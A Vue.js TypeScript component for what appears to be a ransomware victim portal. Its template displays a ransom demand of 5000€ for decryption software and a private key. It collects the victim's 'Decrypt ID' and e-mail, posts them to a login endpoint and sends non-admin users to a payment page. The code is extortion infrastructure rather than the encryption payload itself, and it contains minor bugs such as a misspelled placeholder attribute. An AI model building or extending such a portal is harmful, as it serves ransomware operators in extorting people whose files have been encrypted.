<template>
    <div class="form_page">
        <div class="title">
            <h2 class="title-label medium"> Log In </h2>
        </div>
        <div class="card w-40">
            <form class="card-form" @submit.prevent="submit(user)">
                <p v-if="error" class="card-error">
                    {{ error }}
                </p>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.decryptId" placeholder="Decrypt ID" required/>
                </div>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.username" placeholde="E-mail" required/>
                </div>
                <div class="action">
                    <button class="action-button">LOGIN</button>
                </div>
            </form>
            Attention
            Price of software and your private key is 5000€. With this product you can decrypt all your files
            il your are winlling to pay for a software product, then:
            Deer user,
            leave your decrypt id and email. We will contact you within twenty four hours and give further instructions !!!!!!!!!
            you do not need to leave different electronic addresses or the same address many time
        </div>
    </div>
</template>

<script lang="ts">
import HttpRequest from '../core/services/http/HttpRequest';
import { defineComponent } from 'vue';
import {isAdmin, isLogged} from '../core/services/utils/auth';

export default defineComponent({
    name: 'Signin',
    data() {
        return {
            token: isLogged(),
            user: {
                email: null,
                decryptId: null
            },
            error: null as string | null
        }
    },
    methods: {
        submit(user: any): void {
            HttpRequest.post('/login_check', user)
                .then((response: any) => {
                    sessionStorage.setItem('token', response.data.token)
                    if(isAdmin(response.data.token)) {
                        this.$router.push('/')
                    } else {
                        this.$router.push('/payment')
                    }
                })
                .catch((error : any) => {
                    this.error = error.response.data.message;
                });
        }
    },
    created() {
        if(this.token) {
            this.$router.push('/')
        }
    }
});
</script>

<style lang="scss" scoped>

</style>
